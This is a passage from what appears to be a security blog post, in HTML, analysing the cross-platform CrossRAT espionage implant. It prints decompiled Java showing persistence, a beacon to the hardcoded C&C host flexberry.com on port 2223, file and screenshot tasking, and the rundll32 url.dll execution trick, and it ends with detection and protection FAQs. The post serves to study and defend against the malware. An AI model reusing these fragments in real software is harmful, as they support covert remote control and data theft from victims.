    <span style="color: #006600;">//persist: Linux</span>
    else if ((((a.a)localObject5).d()) &amp;&amp; 
            (!GraphicsEnvironment.getLocalGraphicsEnvironment().isHeadlessInstance())) {
      paramArrayOfString = new b.d(paramArrayOfString, (String)localObject4, true);
    } 
    ...
    
    <span style="color: #006600;">//error: unknown OS</span>
    else {
      throw new RuntimeException("Unknown operating system " + ((a.a)localObject5).c());
    }
    ...</pre>
</span>
</div>
<br>
We can again observe this persistence by monitoring the file system, or <a class="inlineLink" href="https://objective-see.com/products/blockblock.html">BlockBlock</a> detects this persistence attempt:
<br><br>
      <span><img src="../images/blog/blog_0x28/blockblock.png" width="800" style="display:block; margin:auto;"/></span>
Now the malware has persistently installed itself, it checks in with the C&amp;C server for tasking. As noted the EFF/Lookout <a class="inlineLink" href="https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf">report</a> the malware will connect to <span class="n3rdFont">flexberry.com</span> on port <span class="n3rdFont">2223</span>.
<br>
<br>
This C&amp;C info is hardcoded in the <span class="n3rdFont">crossrat/k.class</span> file:
<br><br>
      <span><img src="../images/blog/blog_0x28/server.png" width="800" style="display:block; margin:auto;"/></span>
<br>
<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size:15px;">
  <span class="n3rdFont">
  <pre>  public static void main(String args[])
  {
      ...

      <span style="color: #006600;">//connect to C&amp;C server</span>
      Socket socket;
      (socket = new Socket(crossrat.k.b, crossrat.k.c)).setSoTimeout(0x1d4c0);
    
      ...</pre>
</span>
</div>
<br>
When the malware checks in with the C&amp;C server for tasking, it will transmit various information about the infected host, such as version and name of the operating system, host name, and user name. The generation of this information is shown in code below:
<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size:15px;">
  <span class="n3rdFont">
  <pre>  public static void main(String args[])
  {
    ...
    if((k.g = (k.h = Preferences.userRoot()).get("UID", null)) == null)
    {
        k.g = (k.f = UUID.randomUUID()).toString();
        k.h.put("UID", k.g);
    }
    String s1 = System.getProperty("os.name");
    String s2 = System.getProperty("os.version");
    args = System.getProperty("user.name");
    Object obj1;
    obj1 = ((InetAddress) (obj1 = InetAddress.getLocalHost())).getHostName();
    obj1 = (new StringBuilder(String.valueOf(args))).append("^")
            .append(((String) (obj1))).toString();
    ...</pre>
</span>
</div>
<br>
The malware then parses the response from the C&amp;C server and if tasking is found acts on it.
<br>
<br>
If you made it this far, I'm sure you're wondering what the malware can actual do! That is to say, what's it's capabilities? its features? Lucky for us, the EFF/Lookout <a class="inlineLink" href="https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf">report</a> provides some details. Below are annotations from their report of the <span class="n3rdFont">crossrat/k.class</span> which contains <span class="n3rdFont">CrossRat</span>'s tasking values:
<div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
  <span class="n3rdFont">
  <pre>
    <span style="color: #006600;">// Server command prefixes</span>
    public static String m = "@0000"; <span style="color: #006600;">// Enumerate root directories on the system. 0 args</span>
    public static String n = "@0001"; <span style="color: #006600;">// Enumerate files on the system. 1 arg</span>
    public static String o = "@0002"; <span style="color: #006600;">// Create blank file on system. 1 arg</span>
    public static String p = "@0003"; <span style="color: #006600;">// Copy File. 2 args</span>
    public static String q = "@0004"; <span style="color: #006600;">// Move file. 2 args</span>
    public static String r = "@0005"; <span style="color: #006600;">// Write file contents. 4 args</span>
    public static String s = "@0006"; <span style="color: #006600;">// Read file contents. 4 args</span>
    public static String t = "@0007"; <span style="color: #006600;">// Heartbeat request. 0 args</span>
    public static String u = "@0008"; <span style="color: #006600;">// Get screenshot. 0 args</span>
    public static String v = "@0009"; <span style="color: #006600;">// Run a DLL 1 arg</span></pre>
</span>
</div>
<br>
The code that uses these value can be found in the <span class="n3rdFont">crossrat/client.class</span> file, where, as we mentioned, the malware parses and acts upon the response from the C&amp;C server:

<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size:15px;">
  <span class="n3rdFont">
  <pre>  public static void main(String args[])
  {
    ...

    <span style="color: #006600;">//enum root directories</span>
    if((args1 = args.split((new StringBuilder("\\"))
        .append(crossrat.k.d).toString()))[0].equals(k.m))
    {
        new crossrat.e();
        crossrat.e.a();
        f f1;
        (f1 = new f()).start();
    } 

    <span style="color: #006600;">//enum files</span>
    else if(args1[0].equals(k.n))
        (args = new crossrat.c(args1[1])).start();
    
    <span style="color: #006600;">//create blank file</span>
    else if(args1[0].equals(k.o))
        (args = new crossrat.a(args1[1])).start();
    
    <span style="color: #006600;">//copy file</span>
    else if(args1[0].equals(k.p))
        (args = new crossrat.b(args1[1], args1[2])).start();

     ...</pre>
      
</span>
</div>
<br>
Let's look at some of the more 'interesting' commands such as the screen capture and dll loading.
<br>
<br>
When the malware receives the string <span class="n3rdFont">"0008"</span> (<span class="n3rdFont">'k.u'</span>) from the C&amp;C server is instantiates and 'runs' a <span class="n3rdFont">'j'</span> object, passing in <span class="n3rdFont">'k.b'</span> and <span class="n3rdFont">'k.c'</span>:
<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size:15px;">
  <span class="n3rdFont">
  <pre>  public static void main(String args[])
  {
    ...

    <span style="color: #006600;">//C&amp;C server addr</span>
    public static String b = "flexberry.com";

    <span style="color: #006600;">//C&amp;C server port</span>
    public static int c = 2223;

    <span style="color: #006600;">//handle cmd: 0008
    // pass in C&amp;C addr/port</span>
    else if(args1[0].equals(k.u))
      (args = new j(crossrat.k.b, crossrat.k.c)).start();

    ...</pre>
      
</span>
</div>
<br>
The <span class="n3rdFont">'j'</span> object is defined in the <span class="n3rdFont">crossrat/j.class</span> file:
<br><br>
      <span><img src="../images/blog/blog_0x28/screenCapt.png" width="800" style="display:block; margin:auto;"/></span>
<br>
Via the <span class="n3rdFont">java.awt.Robot().createScreenCapture</span> the malware performs a screen capture, temporarily saves it as a disk (as a .jpg with a randomized name), before exfiltrating it to the C&amp;C server. 
<br>
<br>
Another interesting command is <span class="n3rdFont">"0009"</span>. When the malware receives this command it instantiates a kicks off an <span class="n3rdFont">'i'</span>. This object is implemented in the <span class="n3rdFont">crossrat/i.class</span> file:
<br><br>
      <span><img src="../images/blog/blog_0x28/rundll.png" width="800" style="display:block; margin:auto;"/></span>
<br>
When the malware is executing on a Window machine, it will execute invoke <span class="n3rdFont">rundll32</span> to load <span class="n3rdFont">url.dll</span> and invoke it's <span class="n3rdFont">FileProtocolHandler</span> method:
<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size:15px;">
  <span class="n3rdFont">
  <pre>   <span style="color: #006600;">//open a file</span>
   Runtime.getRuntime().exec(new String[] {
            "rundll32", "url.dll,FileProtocolHandler", file.getAbsolutePath()
   });</pre>
      
</span>
</div>
<br>
The <span class="n3rdFont">url.dll</span> is a legitimate Microsoft library which can be (ab)used to launch executable on an infected system. For example, on Windows, the following will launch Calculator:
<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size:15px;">
  <span class="n3rdFont">
  <pre>   <span style="color: #006600;">//execute a binary</span>
   Runtime.getRuntime().exec(new String[] {
            "rundll32", "url.dll,FileProtocolHandler", <b>"calc.exe"</b>
   });</pre>
      
</span>
</div>
<br>
On systems other than Windows, it appears that the <span class="n3rdFont">"0009"</span> command will execute the specified file via the <span class="n3rdFont">Desktop.getDesktop().open()</span> method.
<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size:15px;">
  <span class="n3rdFont">
  <pre>  <span style="color: #006600;">//execute a binary</span>
  else if ((locala.a() == c.b) || (locala.a() == c.c)) {
  try
  {
    Desktop.getDesktop().open(localFile);
  }</pre>
      
</span>
</div>
<br>
<span style="color: #95c02d; font-weight: bold;">Conclusions</span><br>
In this blog post we provided an in-depth technical analysis of the newly discovered cross-platform cyber-espionage implant <span class="n3rdFont">CrossRAT</span>. Thought not particularly sophisticated version 0.1 of this malware is still fairly feature-complete and able to run on a large number of platforms. Moreover, as noted by the EFF/Lookout the attackers utilizing <span class="n3rdFont">CrossRAT</span> seem to be both (decently) competent, motivated, and successful.
<br>
<br>
Let's end with a few FAQs!
<br>
<br>
<span style="color: #95c02d; font-weight: bold;">Q:</span> How does one get infected by <span class="n3rdFont">CrossRAT</span>?<br> 
<span style="color: #95c02d; font-weight: bold;">A:</span> In their report, the EFF/Lookout, note: "<i>[the attackers] rely primarily on social media, phishing, and in some cases physical access to compromise target systems, devices, and accounts.</i>"
<br>
<br>
<span style="color: #95c02d; font-weight: bold;">Q:</span> How can I protect myself from an infection?<br> 
<span style="color: #95c02d; font-weight: bold;">A:</span> As <span class="n3rdFont">CrossRAT</span> is written in Java, it requires Java to be installed. Luckily recent versions of macOS do <i>not</i> ship with Java. Thus, most macOS users should be safe! Of course if a Mac user already has Java installed, or the attacker is able to coerce a naive user to install Java first, <span class="n3rdFont">CrossRAT</span> will run just dandy, even on the latest version of macOS (High Sierra). 
<br>
<br>
It is also worth noting that currently AV detections seem rather non-existent (1/59 on Virus Total). Thus having anti-virus software installed likely won't prevent or detect a <span class="n3rdFont">CrossRAT</span> infection. However tools that instead detect suspicious behaviors, such as persistence, can help!
<br>
<br>
For example <a class="inlineLink" href="https://objective-see.com/products/blockblock.html">BlockBlock</a> easily detects <span class="n3rdFont">CrossRAT</span> when it attempts to persist:
<br><br>
      <span><img src="../images/blog/blog_0x28/blockblock.png" width="800" style="display:block; margin:auto;"/></span>
<span style="color: #95c02d; font-weight: bold;">Q:</span> How can I tell if I'm infected with <span class="n3rdFont">CrossRAT</span>?<br> 
<span style="color: #95c02d; font-weight: bold;">A:</span> First check to see if there is an instance of Java is running, that's executing <span class="n3rdFont">mediamgrs.jar</span>.
<br><br>
On macOS or Linux use the <span class="n3rdFont">'ps'</span> command:
<div style="padding: 10px; background-color:black; color:lime; font-size: 15px;">
  <span class="n3rdFont"><pre>   $ ps aux | grep mediamgrs.jar
   user  01:51AM  /usr/bin/java -jar /Users/user/Library/<b>mediamgrs.jar</b></pre>
</span> 
</div>
<br>
One can also look for the persistent artifacts of the malware. However, as the malware persists in an OS-specific manner, detecting this will depend what OS you're running. 
<ul style="list-style-type:square">
    <li>Windows:<br>
    Check the <span class="n3rdFont">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\</span> registry key. If infected it will contain a command that includes, <span class="n3rdFont">java</span>, <span class="n3rdFont">-jar</span> and <span class="n3rdFont">mediamgrs.jar</span>.
    </li><br>

    <li>Mac:<br>
    Check for jar file, <span class="n3rdFont">mediamgrs.jar</span>, in ~/Library. 
    <br>
    <br>
    Also look for launch agent in <span class="n3rdFont">/Library/LaunchAgents</span> or <span class="n3rdFont">~/Library/LaunchAgents</span> named <span class="n3rdFont">mediamgrs.plist</span>.
    </li><br>

    <li>Linux:<br>
    Check for jar file, <span class="n3rdFont">mediamgrs.jar</span>, in /usr/var. 
    <br>
    <br>
    Also look for an 'autostart' file in the <span class="n3rdFont">~/.config/autostart</span> likely named <span class="n3rdFont">mediamgrs.desktop</span>.
    </li>
</ul>
<br>
<span style="color: #95c02d; font-weight: bold;">Q:</span> On an infected system, what can <span class="n3rdFont">CrossRAT</span> do?<br> 
<span style="color: #95c02d; font-weight: bold;">A:</span> <span class="n3rdFont">CrossRAT</span> allows an remote attacker complete control over an infected system. Some of it's persistent capabilities include:

<ul style="list-style-type:square">
    <li>
    file upload/download/create/delete
    </li><br>
    <li>
    screen capture
    </li><br>
    <li>
    run arbitrary executables
    </li>
</ul>
<br>
Well that wraps up our blog on <span class="n3rdFont">CrossRAT</span>! Mahalo for reading :)

<br>
<br>
<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 15px;">
	<span class="n3rdFont">
	love these blog posts &amp; tools? you can support them via <a class="inlineLink" href="https://www.patreon.com/objective_see"><span class="n3rdFont">patreon</span></a>! Mahalo :) 
	<br>
	</span>
	</div>
	<br>
	<br>
	<br>
	</span>
	</div>
	</section>	
</div>		

<!-- footer, copyright notice and social media icons -->
<nav role="footer">
<ul>
	<li class="copyright">&copy; 2018 objective-see llc</li>
	<li><a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon ss-social">&#x2709;</span></a></li>
	<li><a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon ss-social">&#xF611;</span></a></li>
	<li><a href="../rss.xml" class="menubutton icon"><span class="ss-icon">&#xE310;</span></a></li>
	<li>
        <a href="https://www.patreon.com/bePatron?u=4857001" class="menubutton icon donate" style="font-size: 18px; padding-top: 14px;">donate!</a>
    </li>
</ul>
</nav>

</body>
</html>
